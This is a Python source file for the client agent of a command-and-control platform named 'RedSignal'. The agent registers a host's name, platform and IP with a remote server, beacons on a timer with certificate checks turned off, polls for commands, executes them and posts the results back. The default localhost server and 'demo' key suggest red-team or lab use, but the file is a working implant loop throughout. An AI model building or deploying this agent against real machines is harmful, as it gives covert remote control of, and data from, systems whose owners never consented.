"""
RedSignal Client Agent - Main client component that connects to C2 server.
Handles beacon transmission, command reception, and response delivery.
"""

import asyncio
import json
import time
import uuid
import socket
import platform
import psutil
from typing import Optional, Dict, Any
import aiohttp
import yaml
from pathlib import Path

from ..common.protocol import (
    BeaconMessage,
    CommandMessage,
    ResponseMessage,
    ProtocolHandler,
    MessageType,
    CommandType,
)
from ..common.logger import get_logger
from .command_executor import CommandExecutor
from .beacon import BeaconManager

logger = get_logger(__name__)


class RedSignalAgent:
    """Main client agent for RedSignal C2 platform."""

    def __init__(self, config_path: str = "config/client_config.yaml"):
        self.config = self._load_config(config_path)
        self.client_id = self._generate_client_id()
        self.session = None
        self.running = False

        # Initialize components
        self.command_executor = CommandExecutor(self.client_id)
        self.beacon_manager = BeaconManager(self.client_id)
        self.protocol_handler = ProtocolHandler()

        # Connection settings
        self.server_url = self.config["client"]["server_url"]
        self.beacon_interval = self.config["client"]["beacon_interval"]
        self.api_key = self.config["security"]["api_key"]

        logger.info(f"Agent initialized with ID: {self.client_id}")

    def _load_config(self, config_path: str) -> Dict[str, Any]:
        """Load client configuration from YAML file."""
        try:
            with open(config_path, "r") as f:
                return yaml.safe_load(f)
        except Exception as e:
            logger.error(f"Failed to load config: {e}")
            # Return default config
            return {
                "client": {
                    "server_url": "http://localhost:8443",
                    "beacon_interval": 30,
                    "max_retries": 5,
                    "retry_delay": 10,
                },
                "security": {"api_key": "redsignal-demo-key-2024"},
            }

    def _generate_client_id(self) -> str:
        """Generate unique client identifier."""
        config_id = self.config.get("identification", {}).get("client_id")
        if config_id:
            return config_id

        # Generate based on hostname and MAC address
        hostname = socket.gethostname()
        try:
            mac = ":".join(
                [
                    "{:02x}".format((uuid.getnode() >> elements) & 0xFF)
                    for elements in range(0, 2 * 6, 2)
                ][::-1]
            )
            return f"{hostname}-{mac[-8:]}"
        except Exception:
            return f"{hostname}-{str(uuid.uuid4())[:8]}"

    async def start(self):
        """Start the agent and begin C2 communication."""
        logger.info("Starting RedSignal Agent...")
        self.running = True

        # Create HTTP session
        connector = aiohttp.TCPConnector(ssl=False)
        self.session = aiohttp.ClientSession(
            connector=connector, headers={"X-API-Key": self.api_key}
        )

        try:
            # Register with server
            await self._register_with_server()

            # Start main communication loop
            await self._communication_loop()

        except KeyboardInterrupt:
            logger.info("Agent stopped by user")
        except Exception as e:
            logger.error(f"Agent error: {e}")
        finally:
            await self.stop()

    async def stop(self):
        """Stop the agent gracefully."""
        logger.info("Stopping RedSignal Agent...")
        self.running = False

        if self.session:
            await self.session.close()

    async def _register_with_server(self):
        """Register this agent with the C2 server."""
        registration_data = {
            "client_id": self.client_id,
            "hostname": socket.gethostname(),
            "platform": platform.platform(),
            "ip_address": self._get_local_ip(),
            "registration_time": time.time(),
        }

        try:
            async with self.session.post(
                f"{self.server_url}/api/register", json=registration_data
            ) as response:
                if response.status == 200:
                    logger.info("Successfully registered with server")
                else:
                    logger.warning(f"Registration failed: {response.status}")
        except Exception as e:
            logger.error(f"Registration error: {e}")

    async def _communication_loop(self):
        """Main communication loop - beacon and command processing."""
        last_beacon = 0

        while self.running:
            try:
                current_time = time.time()

                # Send beacon if interval elapsed
                if current_time - last_beacon >= self.beacon_interval:
                    await self._send_beacon()
                    last_beacon = current_time

                # Check for commands
                await self._check_for_commands()

                # Sleep briefly to prevent busy waiting
                await asyncio.sleep(1)

            except Exception as e:
                logger.error(f"Communication loop error: {e}")
                await asyncio.sleep(5)  # Wait before retrying

    async def _send_beacon(self):
        """Send beacon message to server."""
        try:
            beacon = self.beacon_manager.create_beacon()
            beacon_data = self.protocol_handler.serialize(beacon)

            async with self.session.post(
                f"{self.server_url}/api/beacon",
                data=beacon_data,
                headers={"Content-Type": "application/json"},
            ) as response:
                if response.status == 200:
                    logger.debug("Beacon sent successfully")
                else:
                    logger.warning(f"Beacon failed: {response.status}")

        except Exception as e:
            logger.error(f"Beacon error: {e}")

    async def _check_for_commands(self):
        """Check server for pending commands."""
        try:
            async with self.session.get(
                f"{self.server_url}/api/commands/{self.client_id}"
            ) as response:
                if response.status == 200:
                    commands_data = await response.json()

                    for command_data in commands_data.get("commands", []):
                        await self._process_command(command_data)

                elif response.status != 204:  # 204 = No commands
                    logger.warning(f"Command check failed: {response.status}")

        except Exception as e:
            logger.error(f"Command check error: {e}")

    async def _process_command(self, command_data: Dict[str, Any]):
        """Process a single command from the server."""
        try:
            # Parse command
            command_data["message_type"] = MessageType.COMMAND
            command_data["command_type"] = CommandType(command_data["command_type"])
            command = CommandMessage.from_dict(command_data)

            logger.info(f"Processing command: {command.command_type.value}")

            # Execute command
            start_time = time.time()
            result = self.command_executor.execute_command(
                command.command_type, command.parameters
            )
            execution_time = time.time() - start_time

            # Create response
            response = ResponseMessage(
                client_id=self.client_id,
                command_id=command.message_id,
                success="error" not in result,
                data=result,
                error_message=result.get("error"),
                execution_time=execution_time,
            )

            # Send response
            await self._send_response(response)

        except Exception as e:
            logger.error(f"Command processing error: {e}")

            # Send error response
            error_response = ResponseMessage(
                client_id=self.client_id,
                command_id=command_data.get("message_id", "unknown"),
                success=False,
                data={},
                error_message=str(e),
            )
            await self._send_response(error_response)

    async def _send_response(self, response: ResponseMessage):
        """Send command response to server."""
        try:
            response_data = self.protocol_handler.serialize(response)

            async with self.session.post(
                f"{self.server_url}/api/response",
                data=response_data,
                headers={"Content-Type": "application/json"},
            ) as http_response:
                if http_response.status == 200:
                    logger.debug("Response sent successfully")
                else:
                    logger.warning(f"Response failed: {http_response.status}")

        except Exception as e:
            logger.error(f"Response error: {e}")

    def _get_local_ip(self) -> str:
        """Get local IP address."""
        try:
            # Connect to a remote address to determine local IP
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                return s.getsockname()[0]
        except Exception:
            return "127.0.0.1"


async def main():
    """Main entry point for the agent."""
    agent = RedSignalAgent()
    await agent.start()


if __name__ == "__main__":
    asyncio.run(main())

